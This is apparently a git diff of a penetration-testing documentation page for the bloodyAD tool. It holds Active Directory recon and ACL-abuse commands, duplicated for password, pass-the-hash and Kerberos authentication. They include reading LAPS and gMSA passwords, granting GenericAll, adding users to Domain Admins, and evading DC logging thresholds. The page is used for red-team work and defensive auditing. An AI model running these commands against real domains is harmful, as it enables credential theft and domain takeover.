@@ -41,160 +41,474 @@ The `get` and `msldap` subcommands cover the most useful recon paths. Start with
 
 `get writable` is the first command to run after gaining a foothold. It shows every AD object your current user has write access to, which directly maps to abuse paths.
 
-```bash wrap
-# Find everything the current user can write to
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Find everything the current user can write to
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable
 
-# Scope to a specific object type
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype USER
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype COMPUTER
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype GROUP
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype OU
+    # Scope to a specific object type
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype USER
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype COMPUTER
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype GROUP
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype OU
 
-# Filter by right type
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --right WRITE   # write access
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --right CHILD   # create/delete children
+    # Filter by right type
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --right WRITE   # write access
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --right CHILD   # create/delete children
 
-# Show attribute-level detail: which specific attributes are writable per object
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype USER --detail
+    # Show attribute-level detail: which specific attributes are writable per object
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype USER --detail
 
-# Include deleted/tombstoned objects in the writable results
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --include-del
-```
+    # Include deleted/tombstoned objects in the writable results
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --include-del
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Find everything the current user can write to
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get writable
+
+    # Scope to a specific object type
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get writable --otype USER
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get writable --otype COMPUTER
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get writable --otype GROUP
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get writable --otype OU
+
+    # Filter by right type
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get writable --right WRITE   # write access
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get writable --right CHILD   # create/delete children
+
+    # Show attribute-level detail: which specific attributes are writable per object
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get writable --otype USER --detail
+
+    # Include deleted/tombstoned objects in the writable results
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get writable --include-del
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Find everything the current user can write to
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get writable
+
+    # Scope to a specific object type
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get writable --otype USER
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get writable --otype COMPUTER
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get writable --otype GROUP
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get writable --otype OU
+
+    # Filter by right type
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get writable --right WRITE   # write access
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get writable --right CHILD   # create/delete children
+
+    # Show attribute-level detail: which specific attributes are writable per object
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get writable --otype USER --detail
+
+    # Include deleted/tombstoned objects in the writable results
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get writable --include-del
+    ```
+  </Tab>
+</Tabs>
 
 ### Object Attributes
 
 `get object` reads LDAP attributes of any single AD object. Use it to inspect userAccountControl flags, retrieve LAPS passwords, gMSA secrets, or group membership before attempting abuse.
 
-```bash wrap
-# Read all attributes of a user
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get object svc_backup
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Read all attributes of a user
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get object svc_backup
 
-# Check machine account quota before RBCD or Certifried attacks
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
+    # Check machine account quota before RBCD or Certifried attacks
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
 
-# Read userAccountControl to check account flags (disabled, no-preauth, etc.)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object $TARGET --attr userAccountControl
+    # Read userAccountControl to check account flags (disabled, no-preauth, etc.)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object $TARGET --attr userAccountControl
 
-# Read all members of a group
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object "Domain Admins" --attr member
+    # Read all members of a group
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object "Domain Admins" --attr member
 
-# Retrieve LAPS plaintext password (requires read access to ms-Mcs-AdmPwd)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object DC01$ --attr ms-Mcs-AdmPwd
+    # Retrieve LAPS plaintext password (requires read access to ms-Mcs-AdmPwd)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object DC01$ --attr ms-Mcs-AdmPwd
 
-# Retrieve gMSA managed password blob (requires membership in PrincipalsAllowedToRetrieveManagedPassword)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object 'gmsa_svc$' --attr msDS-ManagedPassword
-```
+    # Retrieve gMSA managed password blob (requires membership in PrincipalsAllowedToRetrieveManagedPassword)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object 'gmsa_svc$' --attr msDS-ManagedPassword
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Read all attributes of a user
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get object svc_backup
+
+    # Check machine account quota before RBCD or Certifried attacks
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
+
+    # Read userAccountControl to check account flags (disabled, no-preauth, etc.)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object $TARGET --attr userAccountControl
+
+    # Read all members of a group
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object "Domain Admins" --attr member
+
+    # Retrieve LAPS plaintext password (requires read access to ms-Mcs-AdmPwd)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object DC01$ --attr ms-Mcs-AdmPwd
+
+    # Retrieve gMSA managed password blob (requires membership in PrincipalsAllowedToRetrieveManagedPassword)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object 'gmsa_svc$' --attr msDS-ManagedPassword
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Read all attributes of a user
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get object svc_backup
+
+    # Check machine account quota before RBCD or Certifried attacks
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
+
+    # Read userAccountControl to check account flags (disabled, no-preauth, etc.)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object $TARGET --attr userAccountControl
+
+    # Read all members of a group
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object "Domain Admins" --attr member
+
+    # Retrieve LAPS plaintext password (requires read access to ms-Mcs-AdmPwd)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object DC01$ --attr ms-Mcs-AdmPwd
+
+    # Retrieve gMSA managed password blob (requires membership in PrincipalsAllowedToRetrieveManagedPassword)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object 'gmsa_svc$' --attr msDS-ManagedPassword
+    ```
+  </Tab>
+</Tabs>
 
 ### Membership and Hierarchy
 
 These commands help map group relationships and OU structure without needing BloodHound ingested.
 
-```bash wrap
-# All groups a user belongs to (recursive by default)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get membership $TARGET
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # All groups a user belongs to (recursive by default)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get membership $TARGET
 
-# List all objects under an OU
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get children "OU=Servers,DC=$DOMAIN,DC=local"
+    # List all objects under an OU
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get children "OU=Servers,DC=$DOMAIN,DC=local"
 
-# Scope children to a specific object type
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get children "OU=Servers,DC=$DOMAIN,DC=local" --otype COMPUTER
-```
+    # Scope children to a specific object type
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get children "OU=Servers,DC=$DOMAIN,DC=local" --otype COMPUTER
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # All groups a user belongs to (recursive by default)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get membership $TARGET
+
+    # List all objects under an OU
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get children "OU=Servers,DC=$DOMAIN,DC=local"
+
+    # Scope children to a specific object type
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get children "OU=Servers,DC=$DOMAIN,DC=local" --otype COMPUTER
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # All groups a user belongs to (recursive by default)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get membership $TARGET
+
+    # List all objects under an OU
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get children "OU=Servers,DC=$DOMAIN,DC=local"
+
+    # Scope children to a specific object type
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get children "OU=Servers,DC=$DOMAIN,DC=local" --otype COMPUTER
+    ```
+  </Tab>
+</Tabs>
 
 ### Raw LDAP Search
 
 `get search` issues a raw LDAP query. Use it when no built-in subcommand covers what you need.
 
-```bash wrap
-# Find all users with a description set (often contains passwords)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get search --filter '(&(objectClass=user)(description=*))' --attr sAMAccountName,description
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Find all users with a description set (often contains passwords)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get search --filter '(&(objectClass=user)(description=*))' --attr sAMAccountName,description
 
-# Find all enabled user accounts
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get search --filter '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
-  --attr sAMAccountName
+    # Find all enabled user accounts
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get search --filter '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
+      --attr sAMAccountName
 
-# Scope the search base to a specific OU to stay below DC-side logging thresholds
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get search --base "CN=Users,DC=$DOMAIN,DC=local" \
-  --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
-  --attr sAMAccountName
-```
+    # Scope the search base to a specific OU to stay below DC-side logging thresholds
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get search --base "CN=Users,DC=$DOMAIN,DC=local" \
+      --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
+      --attr sAMAccountName
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Find all users with a description set (often contains passwords)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get search --filter '(&(objectClass=user)(description=*))' --attr sAMAccountName,description
+
+    # Find all enabled user accounts
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get search --filter '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
+      --attr sAMAccountName
+
+    # Scope the search base to a specific OU to stay below DC-side logging thresholds
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get search --base "CN=Users,DC=$DOMAIN,DC=local" \
+      --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
+      --attr sAMAccountName
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Find all users with a description set (often contains passwords)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get search --filter '(&(objectClass=user)(description=*))' --attr sAMAccountName,description
+
+    # Find all enabled user accounts
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get search --filter '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
+      --attr sAMAccountName
+
+    # Scope the search base to a specific OU to stay below DC-side logging thresholds
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get search --base "CN=Users,DC=$DOMAIN,DC=local" \
+      --filter '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
+      --attr sAMAccountName
+    ```
+  </Tab>
+</Tabs>
 
 ### DNS Records
 
 `get dnsDump` is useful for internal network mapping; it returns all DNS zone records the current user can read.
 
-```bash wrap
-# Dump all DNS records from all zones
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get dnsDump
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Dump all DNS records from all zones
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get dnsDump
 
-# Scope to a single zone
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get dnsDump --zone $DOMAIN
-```
+    # Scope to a single zone
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get dnsDump --zone $DOMAIN
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Dump all DNS records from all zones
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get dnsDump
+
+    # Scope to a single zone
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get dnsDump --zone $DOMAIN
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Dump all DNS records from all zones
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get dnsDump
+
+    # Scope to a single zone
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get dnsDump --zone $DOMAIN
+    ```
+  </Tab>
+</Tabs>
 
 ### Trust Relationships
 
-```bash wrap
-# Display domain trust tree
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get trusts
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Display domain trust tree
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get trusts
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Display domain trust tree
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST get trusts
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Display domain trust tree
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST get trusts
+    ```
+  </Tab>
+</Tabs>
 
 ### Delegation Recon
 
 These `msldap` subcommands find delegation misconfigurations that feed into unconstrained, constrained, and RBCD attack chains.
 
-```bash wrap
-# Find computers/users with unconstrained delegation (TrustedForDelegation flag)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap unconstrained
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Find computers/users with unconstrained delegation (TrustedForDelegation flag)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap unconstrained
 
-# Find accounts with constrained delegation (msDS-AllowedToDelegateTo set)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap constrained
+    # Find accounts with constrained delegation (msDS-AllowedToDelegateTo set)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap constrained
 
-# Find accounts that can act as proxy via S4U2Proxy
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap s4u2proxy
-```
+    # Find accounts that can act as proxy via S4U2Proxy
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap s4u2proxy
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Find computers/users with unconstrained delegation (TrustedForDelegation flag)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap unconstrained
+
+    # Find accounts with constrained delegation (msDS-AllowedToDelegateTo set)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap constrained
+
+    # Find accounts that can act as proxy via S4U2Proxy
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap s4u2proxy
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Find computers/users with unconstrained delegation (TrustedForDelegation flag)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap unconstrained
+
+    # Find accounts with constrained delegation (msDS-AllowedToDelegateTo set)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap constrained
+
+    # Find accounts that can act as proxy via S4U2Proxy
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap s4u2proxy
+    ```
+  </Tab>
+</Tabs>
 
 ### Legacy and Service Accounts
 
-```bash wrap
-# Pre-Windows 2000 machine accounts; often have predictable passwords (computer name lowercase)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap pre2000
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Pre-Windows 2000 machine accounts; often have predictable passwords (computer name lowercase)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap pre2000
 
-# List gMSA accounts and attempt to retrieve their passwords
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap gmsa
+    # List gMSA accounts and attempt to retrieve their passwords
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap gmsa
 
-# Find all accounts with SPNs set (Kerberoastable targets)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap spns
+    # Find all accounts with SPNs set (Kerberoastable targets)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap spns
 
-# Find accounts with pre-auth disabled (AS-REP roastable targets)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap asrep
-```
+    # Find accounts with pre-auth disabled (AS-REP roastable targets)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap asrep
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Pre-Windows 2000 machine accounts; often have predictable passwords (computer name lowercase)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap pre2000
+
+    # List gMSA accounts and attempt to retrieve their passwords
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap gmsa
+
+    # Find all accounts with SPNs set (Kerberoastable targets)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap spns
+
+    # Find accounts with pre-auth disabled (AS-REP roastable targets)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap asrep
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Pre-Windows 2000 machine accounts; often have predictable passwords (computer name lowercase)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap pre2000
+
+    # List gMSA accounts and attempt to retrieve their passwords
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap gmsa
+
+    # Find all accounts with SPNs set (Kerberoastable targets)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap spns
+
+    # Find accounts with pre-auth disabled (AS-REP roastable targets)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap asrep
+    ```
+  </Tab>
+</Tabs>
 
 ### LAPS
 
-```bash wrap
-# List all LAPS-enabled computers and retrieve passwords if permitted
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap laps
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # List all LAPS-enabled computers and retrieve passwords if permitted
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap laps
 
-# Find which computers are LAPS targets (without attempting password retrieval)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap lapstarget
-```
+    # Find which computers are LAPS targets (without attempting password retrieval)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap lapstarget
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # List all LAPS-enabled computers and retrieve passwords if permitted
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap laps
+
+    # Find which computers are LAPS targets (without attempting password retrieval)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap lapstarget
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # List all LAPS-enabled computers and retrieve passwords if permitted
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap laps
+
+    # Find which computers are LAPS targets (without attempting password retrieval)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap lapstarget
+    ```
+  </Tab>
+</Tabs>
 
 ### BadSuccessor Check
 
-```bash wrap
-# Check if the domain is vulnerable to the BadSuccessor (dMSA) privilege escalation
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Check if the domain is vulnerable to the BadSuccessor (dMSA) privilege escalation
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Check if the domain is vulnerable to the BadSuccessor (dMSA) privilege escalation
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Check if the domain is vulnerable to the BadSuccessor (dMSA) privilege escalation
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
+    ```
+  </Tab>
+</Tabs>
 
 ## ACL Abuse
 
@@ -204,108 +518,308 @@ ACL abuse flows directly from `get writable` output. These `add`, `remove`, and 
 
 Granting yourself GenericAll on an object gives complete control: you can change its password, modify its attributes, or add it to groups. Requires WriteDacl or ownership of the target.
 
-```bash wrap
-# Grant your user GenericAll on a target user
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Grant your user GenericAll on a target user
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
 
-# Remove after abuse to reduce noise
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  remove genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
-```
+    # Remove after abuse to reduce noise
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      remove genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Grant your user GenericAll on a target user
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+
+    # Remove after abuse to reduce noise
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      remove genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Grant your user GenericAll on a target user
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+
+    # Remove after abuse to reduce noise
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      remove genericAll $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+</Tabs>
 
 ### Group Membership
 
 Adding yourself to a privileged group (e.g., Domain Admins, Backup Operators) is the fastest path to elevated access when you have GenericAll or WriteProperty on the group.
 
-```bash wrap
-# Add a user to a group
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add groupMember "Domain Admins" $TARGET
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Add a user to a group
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add groupMember "Domain Admins" $TARGET
 
-# Remove after abuse (clean up is important in real engagements)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  remove groupMember "Domain Admins" $TARGET
-```
+    # Remove after abuse (clean up is important in real engagements)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      remove groupMember "Domain Admins" $TARGET
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Add a user to a group
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add groupMember "Domain Admins" $TARGET
+
+    # Remove after abuse (clean up is important in real engagements)
